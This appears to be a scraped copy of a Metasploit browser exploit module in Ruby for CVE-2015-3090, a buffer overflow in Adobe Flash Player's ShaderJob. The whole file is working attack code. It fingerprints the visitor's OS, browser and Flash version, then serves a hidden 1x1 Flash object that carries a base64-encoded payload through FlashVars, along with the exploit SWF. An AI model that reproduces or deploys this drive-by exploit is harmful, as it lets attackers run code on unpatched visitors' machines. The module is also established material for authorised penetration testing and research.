# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;                => &#039;Adobe Flash Player ShaderJob Buffer Overflow&#039;,
      &#039;Description&#039;         => %q{
        This module exploits a buffer overflow vulnerability related to the ShaderJob workings on
        Adobe Flash Player. The vulnerability happens when trying to apply a Shader setting up the
        same Bitmap object as src and destination of the ShaderJob. Modifying the "width" attribute
        of the ShaderJob after starting the job it&#039;s possible to create a buffer overflow condition
        where the size of the destination buffer and the length of the copy are controlled. This
        module has been tested successfully on:
        * Windows 7 SP1 (32-bit), IE11 and Adobe Flash 17.0.0.169.
        * Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 17.0.0.169.
        * Windows 8.1, Firefox 38.0.5 and Adobe Flash 17.0.0.169.
        * Linux Mint "Rebecca" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.457.
      },
      &#039;License&#039;             => MSF_LICENSE,
      &#039;Author&#039;              =>
        [
          &#039;Chris Evans&#039;, # Vulnerability discovery
          &#039;Unknown&#039;, # Exploit in the wild
          &#039;juan vazquez&#039; # msf module
        ],
      &#039;References&#039;          =>
        [
          [&#039;CVE&#039;, &#039;2015-3090&#039;],
          [&#039;URL&#039;, &#039;https://helpx.adobe.com/security/products/flash-player/apsb15-09.html&#039;],
          [&#039;URL&#039;, &#039;https://www.fireeye.com/blog/threat-research/2015/05/angler_ek_exploiting.html&#039;],
          [&#039;URL&#039;, &#039;http://malware.dontneedcoffee.com/2015/05/cve-2015-3090-flash-up-to-1700169-and.html&#039;],
          [&#039;URL&#039;, &#039;http://www.brooksandrus.com/blog/2009/03/11/bilinear-resampling-with-flash-player-and-pixel-bender/&#039;]
        ],
      &#039;Payload&#039;             =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;            => [&#039;win&#039;, &#039;linux&#039;],
      &#039;Arch&#039;                => [ARCH_X86],
      &#039;BrowserRequirements&#039; =>
        {
          :source  => /script|headers/i,
          :arch    => ARCH_X86,
          :os_name => lambda do |os|
            os =~ OperatingSystems::Match::LINUX ||
              os =~ OperatingSystems::Match::WINDOWS_7 ||
              os =~ OperatingSystems::Match::WINDOWS_81
          end,
          :ua_name => lambda do |ua|
            case target.name
            when &#039;Windows&#039;
              return true if ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF
            when &#039;Linux&#039;
              return true if ua == Msf::HttpClients::FF
            end

            false
          end,
          :flash   => lambda do |ver|
            case target.name
            when &#039;Windows&#039;
              return true if ver =~ /^17\./ && Gem::Version.new(ver) <= Gem::Version.new(&#039;17.0.0.169&#039;)
            when &#039;Linux&#039;
              return true if ver =~ /^11\./ && Gem::Version.new(ver) <= Gem::Version.new(&#039;11.2.202.457&#039;)
            end

            false
          end
        },
      &#039;Targets&#039;             =>
        [
          [ &#039;Windows&#039;,
            {
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [ &#039;Linux&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ]
        ],
      &#039;Privileged&#039;          => false,
      &#039;DisclosureDate&#039;      => &#039;May 12 2015&#039;,
      &#039;DefaultTarget&#039;       => 0))
  end

  def exploit
    @swf = create_swf

    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status(&#039;Sending SWF...&#039;)
      send_response(cli, @swf, {&#039;Content-Type&#039;=>&#039;application/x-shockwave-flash&#039;, &#039;Cache-Control&#039; => &#039;no-cache, no-store&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;})
      return
    end

    print_status(&#039;Sending HTML...&#039;)
    send_exploit_html(cli, exploit_template(cli, target_info), {&#039;Pragma&#039; => &#039;no-cache&#039;})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    b64_payload = Rex::Text.encode_base64(target_payload)
    os_name = target_info[:os_name]

    if target.name =~ /Windows/
      platform_id = &#039;win&#039;
    elsif target.name =~ /Linux/
      platform_id = &#039;linux&#039;
    end

    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" Play="true"/>
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-3090&#039;, &#039;msf.swf&#039;)
    swf =  ::File.open(path, &#039;rb&#039;) { |f| swf = f.read }

    swf
  end
end

